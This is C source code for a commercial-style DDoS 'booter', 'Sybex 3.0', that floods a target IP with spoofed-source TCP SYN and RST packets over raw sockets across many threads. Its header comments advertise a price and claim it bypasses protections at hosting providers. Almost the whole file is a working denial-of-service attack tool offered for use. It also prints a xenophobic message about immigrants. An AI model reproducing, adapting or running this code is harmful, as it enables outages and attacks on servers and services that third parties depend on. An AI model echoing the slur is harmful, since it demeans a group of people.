//
//
// SYBEX 3.0 BOOTER.PW
//
//  Specially made to Serial from Alemalakra.
//
//  Type: TCP-RST Spoofed Bypass PPS.
//  Price: ????????
//  Version: 3.0
//  
//  "-1" PPS For use all Packets-Per-Second.
//  "0" on Port for send Destination-ports fully random, New Bypass.
//  Improved whole script, Works on most targets, Including digital ocean and Hetzner.
//
//

#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include <arpa/inet.h>
#include<netinet/ip.h>    //Provides declarations for ip header
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>
#include <time.h>
static unsigned int floodport;
#define BUFFER_SIZE 100
char sourceip[17];
volatile int limiter; // PPS Limitator.
volatile unsigned int pps; // PPS per Second, Global variable including for Threads.
volatile unsigned int sleeptime = 100; // Sleep in miliseconds for each packet if pps exeded.

volatile unsigned int lenght_pkt = 0;
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};

unsigned short checksum_tcp_packet(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

void *mexico(void *par1)
{

    // Make socket

    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);


    if(s == -1)
    {
        perror("[!] For use Script you need root stupid...");
        exit(1);
    }


    // Declares

    char *targettr = (char *)par1;

    char datagram[4096] , source_ip[32] , *data , *pseudogram;

    //zero out the packet buffer
    memset (datagram, 0, 4096);

    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;

    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    if (lenght_pkt == 0)  { // bypass pps
        data = "";
    }


    // Source Address and Such.


    char primera [ 20 ] ;


    int one_r = randommexico(1, 250);
    int two_r = randommexico(1, 250);
    int three_r = randommexico(1, 250);
    int four_r = randommexico(1, 250);
    snprintf(primera, sizeof(primera)-1, "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
    
    snprintf(sourceip, sizeof(sourceip)-1, primera);
    strcpy(source_ip , sourceip);
    sin.sin_family = AF_INET;


    int rdzeroport;

    if (floodport == 0) {
        rdzeroport = randommexico(2, 65535);

        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons (rdzeroport);

    } else {

        sin.sin_port = htons(floodport);
        tcph->dest = htons (floodport);

    }



    sin.sin_addr.s_addr = inet_addr (targettr);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = htons(1);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; 
    iph->saddr = inet_addr ( source_ip );  
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = checksum_tcp_packet ((unsigned short *) datagram, iph->tot_len);
    int randSeq = randommexico(10000, 99999);
    int randAckSeq = randommexico(10000, 99999);
    int randSP = randommexico(2, 65535);
    int randPD = randommexico(2, 65535);
    int randttl = randommexico(1, 255);
    int randihl = randommexico(4, 7);
    int randWin = randommexico(1000, 9999);
    tcph->source = randSP;

    tcph->seq = randSeq;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = randWin;
    tcph->check = 0;
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );


    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
     
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
     
    tcph->check = checksum_tcp_packet( (unsigned short*) pseudogram , psize);


    //tcph->check = checksum_tcp_packet( (unsigned short*) &psh , sizeof (struct pseudo_header));
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        exit(0);
    }
    int i;
    while (1)
    {
        //Send the packet
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)       /* a normal send() */
        {
            printf ("[!] Error sending Packet!\n");
            exit(0);
        } else {
            one_r = randommexico(1, 250);
            two_r = randommexico(1, 250);
            three_r = randommexico(1, 250);
            four_r = randommexico(1, 250);
            snprintf(primera, sizeof(primera)-1, "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
            snprintf(sourceip, sizeof(sourceip)-1, primera);
            strcpy(source_ip , sourceip);

            iph->saddr = inet_addr ( source_ip ); 
            psh.source_address = inet_addr( source_ip );
            if (lenght_pkt == 0) { // bypass pps
                data = "";
            }


            if (floodport == 0) {
                rdzeroport = randommexico(2, 65535);

                sin.sin_port = htons(rdzeroport);
                tcph->dest = htons (rdzeroport);

            } else {

                sin.sin_port = htons(floodport);
                tcph->dest = htons (floodport);
                
            }


            randSeq = randommexico(10000, 99999);
            randAckSeq = randommexico(10000, 99999);
            randSP = randommexico(2, 65535);
            randPD = randommexico(2, 65535);
            randttl = randommexico(1, 255);
            randWin = 512;

            tcph->source = randSP;
            tcph->doff = 5;      /* first and only tcp segment */
            tcph->seq = htons(randSeq);
            tcph->ack  = 0;
            tcph->ack_seq = 0;
            tcph->psh  = 0; 
            tcph->fin  = 0;
            tcph->rst  = 1;
            tcph->res2 = 0;
            tcph->doff = 5;
            tcph->syn = 0; 
            tcph->urg  = 0;
            tcph->urg_ptr = 0;

            tcph->window = htons(0);
            tcph->check = 0;

            iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;      //Set to 0 before calculating checksum
            iph->daddr = sin.sin_addr.s_addr;
            iph->check = checksum_tcp_packet ((unsigned short *) datagram, iph->tot_len);

            psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
            pseudogram = malloc(psize);
             
            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
             
            tcph->check = checksum_tcp_packet( (unsigned short*) pseudogram , psize);
            int one = 1;
            const int *val = &one;
            if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            {
                exit(0);
            }
            pps++;
            if(i >= limiter)
            {
                i = 0;
            }
            i++;
        }   
    }
}
int randommexico(int min, int max) {
   static bool first = true;
   if (first) {  
      srand( time(NULL) );
      first = false;
   }
   return min + rand() % (max + 1 - min);
}
int main(int argc, char *argv[ ])
{
    if(argc < 6){
        fprintf(stderr, "[!] Sybex 3.0 Priv8 TCP Bypass by Alemalakra.\n");
        fprintf(stdout, "[!] Usage: %s <IP> <PORT> <THREADS> <TIME> <PPS>\n", argv[0]);
        exit(-1);
    }
    int multiplier = 20;
    pps = 0;
    limiter = 0;

    // Arguments of Method.

    floodport = atoi(argv[2]);
    void * target = argv[1];
    int maxim_pps = atoi(argv[5]);
    int num_threads = atoi(argv[3]);
    lenght_pkt = 0;
    pthread_t thread[num_threads];
    int alem = 0;
    int i;
    for(alem = 0;alem<num_threads;alem++){
      pthread_create( &thread[alem], NULL, &mexico, (void *)argv[1]); // Target
    }
    fprintf(stdout, "[!] Sending attack, Please stop inmigrants!\n");
     
    return 0;
}
